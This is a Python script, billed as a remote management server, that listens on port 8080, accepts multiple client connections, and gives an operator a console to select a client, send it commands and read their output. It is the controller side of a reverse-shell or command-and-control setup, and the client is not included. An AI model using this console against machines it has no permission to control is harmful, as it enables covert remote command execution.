import time 
import os
import socket 
import threading
from queue import Queue
###  REMOTE MANAGEMENT SERVER ###

# THREADING SETUP 
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
# ARRAYS TO STORE CONNECTIONS AND ADDRESSES
all_connections = []
all_addresses   = [] 

# CREATES SOCKET
def socket_create():
    try:
        global host
        global port
        global s
        host = socket.gethostname()
        port = 8080
        s = socket.socket()
    except socket.error as msg:
        print("Socket error: " + str(msg))
# BINDS SOCKET TO HOST AND PORT
def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " +str(msg))
        time.sleep(5)
        socket_bind()
# ACCEPT CONNECTIONS - WIPES ARRAYS AND SETS UP CONNECTIONS - (Everytime file is ran the connections are wiped and set up again)
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn,address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established! " + address[0])
        except:
            print("Error accepting connections!")    
    
    
    
# SHELL - EXECUTE COMMANDS
def shell():
    global prevselected
    while 1:
        cmd = input(host+'@ServerShell~# ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_connection(cmd)
            prevselected = cmd  #Stores the last selected client, can be used for more commands later on.
            if conn is not None:
                send_commands(conn)
        elif 'help' in cmd:
            print("""
            list - To list all active connections
            select <id> - To select a client to send commands to
            quit - To quit the server
            """)
        elif 'quit' in cmd:
            print("Server terminated.")
            exit()
        else:
            print("")
            print("Unknown Command...")
            print("")
            
# 'LIST' FUNCTION - TO LIST ALL CONNECTIONS TO SERVER          
def list_connections():
    showlist =""
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(':)')) #TESTS CONNECTION BY SENDING BYTES
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        showlist += str(i) + '     ' + str(all_addresses[i][0]) + '    ' + str(all_addresses[i][1]) +'\n'
    print('--------- CLIENTS --------- '+ '\n' + showlist)
    
# 'SELECT' FUNCTION - GETS CONNECTION WHEN SELECTING (I.E. 'SELECT 0')
def get_connection(cmd):
    try:
        connection = cmd.replace('select ' , '')
        connection = int(connection)
        conn = all_connections[connection]
        print("You have been connected to " +str(all_addresses[connection][0]))
        print(str(all_addresses[connection][0]) + "~> ", end="")
        return conn
    except:
        print("Invalid selection")
        return None
# SENDS COMMANDS TO CLIENT, [CMDS when connected must have '#' before command.]
def send_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response =str(conn.recv(20480),"utf-8")
                print(client_response, end="")
            if cmd == '#quit':
                break

            elif cmd == '#help':
                print("         ")
                print("         ")
                print("         ")
                print("#quit - To quit connection and return to server shell")
        except:
            print("Connection has been lost !")
            break
    
# THREADING AND WORKERS
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()
        
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            shell()
        queue.task_done()
        
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    


create_workers()
create_jobs()

